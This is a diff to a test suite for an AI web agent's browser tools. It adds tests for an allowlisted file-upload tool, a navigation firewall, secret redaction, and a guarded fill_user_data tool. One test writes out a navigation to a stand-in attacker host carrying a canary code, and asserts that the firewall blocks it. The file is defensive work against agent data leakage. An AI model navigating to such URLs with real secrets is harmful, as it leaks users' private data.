@@ -11,7 +11,9 @@ import { WebAgentEventEmitter, WebAgentEventType } from "../../src/events.js";
 import { LanguageModel } from "ai";
 import { z } from "zod";
 import { InvalidRefException, BrowserActionException } from "../../src/errors.js";
+import { SECURITY_BLOCKED_UNTRUSTED_NAVIGATION } from "../../src/security/actionFirewall.js";
 import { generateTextWithRetry, generateObjectWithRetry } from "../../src/utils/retry.js";
+import { SECURITY_BLOCKED_UNTRUSTED_DATA_FILL } from "../../src/security/actionFirewall.js";
 import {
   wrapExternalContentWithWarning,
   ExternalContentLabel,
@@ -197,6 +199,7 @@ describe("Web Action Tools", () => {
       expect(tools).toBeDefined();
       expect(tools.click).toBeDefined();
       expect(tools.fill).toBeDefined();
+      expect(tools.upload_file).toBeDefined();
       expect(tools.select).toBeDefined();
       expect(tools.hover).toBeDefined();
       expect(tools.check).toBeDefined();
@@ -216,6 +219,9 @@ describe("Web Action Tools", () => {
     it("should have correct descriptions", () => {
       expect(tools.click.description).toBe("Click on an element on the page");
       expect(tools.fill.description).toBe("Fill text into an input field");
+      expect(tools.upload_file.description).toBe(
+        "Upload an allowlisted local file to a file input element or its container",
+      );
       expect(tools.select.description).toBe("Select an option from a dropdown");
       expect(tools.hover.description).toBe("Hover over an element");
       expect(tools.check.description).toBe("Check a checkbox");
@@ -480,6 +486,80 @@ describe("Web Action Tools", () => {
     });
   });
 
+  describe("Upload File Action", () => {
+    it("should return upload_disabled by default without calling the browser", async () => {
+      const performActionSpy = vi.spyOn(mockBrowser, "performAction");
+
+      const result = await tools.upload_file.execute({
+        ref: "file1",
+        path: "/tmp/fixture/sample.pdf",
+      });
+
+      expect(performActionSpy).not.toHaveBeenCalled();
+      expect(result).toEqual({
+        success: false,
+        action: "upload_file",
+        ref: "file1",
+        value: "/tmp/fixture/sample.pdf",
+        error: "upload_disabled",
+        isRecoverable: true,
+      });
+    });
+
+    it("should execute upload_file when allowed paths are configured", async () => {
+      context.allowFileUpload = { allowedPaths: ["/tmp/fixture"] };
+      tools = createWebActionTools(context);
+      const performActionSpy = vi.spyOn(mockBrowser, "performAction");
+
+      const result = await tools.upload_file.execute({
+        ref: "file1",
+        path: "/tmp/fixture/sample.pdf",
+      });
+
+      expect(performActionSpy).toHaveBeenCalledWith(
+        "file1",
+        PageAction.UploadFile,
+        "/tmp/fixture/sample.pdf",
+      );
+      expect(result).toEqual({
+        success: true,
+        action: "upload_file",
+        ref: "file1",
+        value: "/tmp/fixture/sample.pdf",
+      });
+    });
+
+    it("should validate upload_file input schema", () => {
+      const schema = tools.upload_file.inputSchema;
+
+      expect(schema.safeParse({ ref: "file1", path: "/tmp/sample.pdf" }).success).toBe(true);
+      expect(schema.safeParse({ ref: "file1" }).success).toBe(false);
+      expect(schema.safeParse({ path: "/tmp/sample.pdf" }).success).toBe(false);
+    });
+
+    it("should return structured browser upload errors as recoverable results", async () => {
+      context.allowFileUpload = { allowedPaths: ["/tmp/fixture"] };
+      tools = createWebActionTools(context);
+      vi.spyOn(mockBrowser, "performAction").mockRejectedValueOnce(
+        new BrowserActionException("upload_file", "upload_path_not_allowed"),
+      );
+
+      const result = await tools.upload_file.execute({
+        ref: "file1",
+        path: "/other/sample.pdf",
+      });
+
+      expect(result).toEqual({
+        success: false,
+        action: "upload_file",
+        ref: "file1",
+        value: "/other/sample.pdf",
+        error: "upload_path_not_allowed",
+        isRecoverable: true,
+      });
+    });
+  });
+
   describe("Select Action", () => {
     it("should execute select action successfully", async () => {
       const performActionSpy = vi.spyOn(mockBrowser, "performAction");
@@ -655,7 +735,9 @@ describe("Web Action Tools", () => {
   });
 
   describe("Navigation Actions", () => {
-    it("should execute goto action successfully", async () => {
+    it("should execute goto action successfully to a trusted host", async () => {
+      context.firewall = { trustedHostnames: new Set(["newsite.com"]), unsafeMode: false };
+      tools = createWebActionTools(context);
       const performActionSpy = vi.spyOn(mockBrowser, "performAction");
       const emitSpy = vi.spyOn(eventEmitter, "emit");
 
@@ -672,6 +754,51 @@ describe("Web Action Tools", () => {
         title: expect.any(String),
         value: "https://newsite.com", // performActionWithValidation adds value field
       });
+    });
+
+    it("should block goto to a host the caller did not name", async () => {
+      // Default context trusts no hosts, so navigation off-allowlist is blocked.
+      const performActionSpy = vi.spyOn(mockBrowser, "performAction");
+      const emitSpy = vi.spyOn(eventEmitter, "emit");
+      const url = "https://attacker.example/collect?code=CANARY-A1B2C3D9";
+
+      const result = await tools.goto.execute({ url });
+
+      expect(result).toEqual({
+        success: false,
+        action: "goto",
+        value: url,
+        error: SECURITY_BLOCKED_UNTRUSTED_NAVIGATION,
+        isRecoverable: true,
+      });
+      // The browser must never navigate — the canary never leaves.
+      expect(performActionSpy).not.toHaveBeenCalled();
+      expect(emitSpy).toHaveBeenCalledWith(
+        WebAgentEventType.FIREWALL_BLOCKED_NON_INTERACTIVE,
+        expect.objectContaining({
+          kind: "navigation",
+          reason: SECURITY_BLOCKED_UNTRUSTED_NAVIGATION,
+        }),
+      );
+      expect(emitSpy).not.toHaveBeenCalledWith(
+        WebAgentEventType.BROWSER_NAVIGATED,
+        expect.anything(),
+      );
+    });
+
+    it("should allow goto to any host in unsafe mode", async () => {
+      context.firewall = { trustedHostnames: new Set<string>(), unsafeMode: true };
+      tools = createWebActionTools(context);
+      const performActionSpy = vi.spyOn(mockBrowser, "performAction");
+
+      const result = await tools.goto.execute({ url: "https://anywhere.example/x" });
+
+      expect(result.success).toBe(true);
+      expect(performActionSpy).toHaveBeenCalledWith(
+        "",
+        PageAction.Goto,
+        "https://anywhere.example/x",
+      );
     });
 
     it("should validate URL format for goto", () => {
@@ -916,6 +1043,22 @@ describe("Web Action Tools", () => {
       expect((result as any).action).toBe("extract");
       expect((result as any).description).toBe("Get important info");
       expect((result as any).extractedData).toContain("Extracted data: Important info");
+    });
+
+    it("redacts caller-data secrets from the page markdown before the extractor sees it", async () => {
+      const SECRET = "super-secret-membership-42";
+      vi.spyOn(mockBrowser, "getMarkdown").mockResolvedValue(`Your code is ${SECRET} — thanks!`);
+      const dataTools: any = createWebActionTools({
+        ...context,
+        sensitiveValues: new Set([SECRET]),
+      });
+      mockGenerateTextWithRetry.mockResolvedValueOnce({ text: "ok" } as any);
+
+      await dataTools.extract.execute({ description: "read the page" });
+
+      const promptArg = (mockGenerateTextWithRetry.mock.calls[0][0] as any).prompt as string;
+      expect(promptArg).not.toContain(SECRET);
+      expect(promptArg).toContain("[hidden]");
     });
 
     it('wraps extractedData in <EXTERNAL-CONTENT label="extract-result"> with safety warning', async () => {
@@ -1223,6 +1366,10 @@ describe("Web Action Tools", () => {
     });
 
     it("should handle errors in navigation actions", async () => {
+      // Trust the host so navigation passes the firewall and reaches the browser,
+      // where we simulate a navigation failure.
+      context.firewall = { trustedHostnames: new Set(["bad-site.com"]), unsafeMode: false };
+      tools = createWebActionTools(context);
       vi.spyOn(mockBrowser, "performAction").mockRejectedValueOnce(
         new BrowserActionException("goto", "Navigation failed"),
       );
@@ -1434,6 +1581,180 @@ describe("Web Action Tools", () => {
       expect(result.success).toBe(false);
       expect(result.error).toBeDefined();
       expect(result.error).not.toMatch(/unsafe_mode|trusted_hostnames|untrusted\.com/);
+    });
+  });
+
+  describe("fill_user_data Action", () => {
+    const SECRET = "super-secret-membership-42";
+    const DATA = { membership_code: SECRET, age: 30, subscribed: true };
+    // A sensitive (non-operational) field: agent fills are blocked on untrusted
+    // hosts, so it exercises the firewall gate rather than the operational path.
+    const emailField: FieldMetadata = {
+      ref: "E12",
+      tagName: "input",
+      inputType: "email",
+      role: "textbox",
+      name: "email",
+      label: "Email",
+      placeholder: null,
+      autocomplete: "email",
+      isContentEditable: false,
+      formId: "signup",
+      formAction: "https://example.com/signup",
+      formMethod: "post",
+    };
+    let udTools: any;
+
+    beforeEach(() => {
+      context.data = DATA;
+      context.approvedRefs = new Set<string>();
+      udTools = createWebActionTools(context);
+    });
+
+    it("is only exposed when data has at least one key", () => {
+      expect(udTools.fill_user_data).toBeDefined();
+      expect(createWebActionTools({ ...context, data: {} }).fill_user_data).toBeUndefined();
+      expect(createWebActionTools({ ...context, data: undefined }).fill_user_data).toBeUndefined();
+    });
+
+    it("is blocked on an untrusted host and neither fills nor leaks the value (security fix)", async () => {
+      mockBrowser.url = "https://untrusted.com/signup";
+      mockBrowser.fieldMetadata.set("E12", emailField);
+      const performActionSpy = vi.spyOn(mockBrowser, "performAction");
+
+      const result = await udTools.fill_user_data.execute({ ref: "E12", key: "membership_code" });
+
+      expect(result.success).toBe(false);
+      expect(result.error).toBe(SECURITY_BLOCKED_UNTRUSTED_DATA_FILL);
+      expect(performActionSpy).not.toHaveBeenCalled();
+      expect(context.agentFilledRefs.has("E12")).toBe(false);
+      expect(JSON.stringify(result)).not.toContain(SECRET);
+    });
+
+    it("blocks placing caller data into an OPERATIONAL field on an untrusted host (no assessFill carve-out)", async () => {
+      // A search box would be allowed by assessFill's operational exemption, but
+      // caller data must not leak into an operational field on an untrusted host.
+      const searchField: FieldMetadata = {
+        ref: "E13",
+        tagName: "input",
+        inputType: "search",
+        role: "searchbox",
+        name: "q",
+        label: "Search",
+        placeholder: "Search",
+        autocomplete: null,
+        isContentEditable: false,
+        formId: "search",
+        formAction: "https://untrusted.com/search",
+        formMethod: "get",
+      };
+      mockBrowser.url = "https://untrusted.com/search";
+      mockBrowser.fieldMetadata.set("E13", searchField);
+      const performActionSpy = vi.spyOn(mockBrowser, "performAction");
+
+      const result = await udTools.fill_user_data.execute({ ref: "E13", key: "membership_code" });
+
+      expect(result.success).toBe(false);
+      expect(result.error).toBe(SECURITY_BLOCKED_UNTRUSTED_DATA_FILL);
+      expect(performActionSpy).not.toHaveBeenCalled();
+      expect(context.agentFilledRefs.has("E13")).toBe(false);
+      expect(context.operationalRefs.has("E13")).toBe(false);
+      expect(JSON.stringify(result)).not.toContain(SECRET);
+    });
+
+    it("fills on a trusted host, masks the value, and records provenance not approval", async () => {
+      mockBrowser.url = "https://example.com/signup";
+      mockBrowser.fieldMetadata.set("E12", emailField);
+      context.firewall = { trustedHostnames: new Set(["example.com"]), unsafeMode: false };
+      udTools = createWebActionTools(context);
+      const performActionSpy = vi.spyOn(mockBrowser, "performAction");
+      const emitSpy = vi.spyOn(eventEmitter, "emit");
+
+      const result = await udTools.fill_user_data.execute({ ref: "E12", key: "membership_code" });
+
+      // The resolved value goes to the browser sink...
+      expect(performActionSpy).toHaveBeenCalledWith("E12", PageAction.Fill, SECRET);
+      // ...but is never returned to the model.
+      expect(result).toEqual({
+        success: true,
+        action: "fill_user_data",
+        ref: "E12",
+        key: "membership_code",
+      });
+      expect(JSON.stringify(result)).not.toContain(SECRET);
+
+      // AGENT_ACTION carries the masked key, never the literal value.
+      expect(emitSpy).toHaveBeenCalledWith(WebAgentEventType.AGENT_ACTION, {
+        action: "fill_user_data",
+        ref: "E12",
+        value: "{{membership_code}}",
+      });
+      // No emitted event payload contains the literal value.
+      for (const call of emitSpy.mock.calls) {
+        expect(JSON.stringify(call)).not.toContain(SECRET);
+      }
+
+      // Provenance recorded for the submit gate; approval NEVER granted.
+      expect(context.agentFilledRefs.has("E12")).toBe(true);
+      expect(context.approvedRefs.has("E12")).toBe(false);
+    });
+
+    it("returns a failure listing available keys for an unknown key without filling", async () => {
+      const performActionSpy = vi.spyOn(mockBrowser, "performAction");
+
+      const result = await udTools.fill_user_data.execute({ ref: "E1", key: "not_a_real_key" });
+
+      expect(performActionSpy).not.toHaveBeenCalled();
+      expect(result.success).toBe(false);
+      expect(result.error).toContain("not_a_real_key");
+      expect(result.error).toContain("membership_code");
+      expect(context.agentFilledRefs.has("E1")).toBe(false);
+    });
+
+    it("uses PageAction.Select for a <select> field", async () => {
+      mockBrowser.url = "https://example.com";
+      mockBrowser.fieldMetadata.set("E9", {
+        ref: "E9",
+        tagName: "select",
+        inputType: null,
+        role: "combobox",
+        name: "country",
+        label: "Country",
+        placeholder: null,
+        autocomplete: null,
+        isContentEditable: false,
+        formId: "signup",
+        formAction: "https://example.com/signup",
+        formMethod: "post",
+      });
+      context.firewall = { trustedHostnames: new Set(["example.com"]), unsafeMode: false };
+      udTools = createWebActionTools(context);
+      const performActionSpy = vi.spyOn(mockBrowser, "performAction");
+
+      await udTools.fill_user_data.execute({ ref: "E9", key: "membership_code" });
+
+      expect(performActionSpy).toHaveBeenCalledWith("E9", PageAction.Select, SECRET);
+    });
+
+    it("returns a recoverable failure when performAction throws BrowserException", async () => {
+      mockBrowser.url = "https://example.com";
+      context.firewall = { trustedHostnames: new Set(["example.com"]), unsafeMode: false };
+      udTools = createWebActionTools(context);
+      vi.spyOn(mockBrowser, "performAction").mockRejectedValueOnce(
+        new BrowserActionException("fill", "element is not editable"),
+      );
+
+      const result = await udTools.fill_user_data.execute({ ref: "E12", key: "membership_code" });
+
+      expect(result).toEqual({
+        success: false,
+        action: "fill_user_data",
+        ref: "E12",
+        error: "element is not editable",
+        isRecoverable: true,
+      });
+      expect(context.agentFilledRefs.has("E12")).toBe(false);
+      expect(JSON.stringify(result)).not.toContain(SECRET);
     });
   });
 });
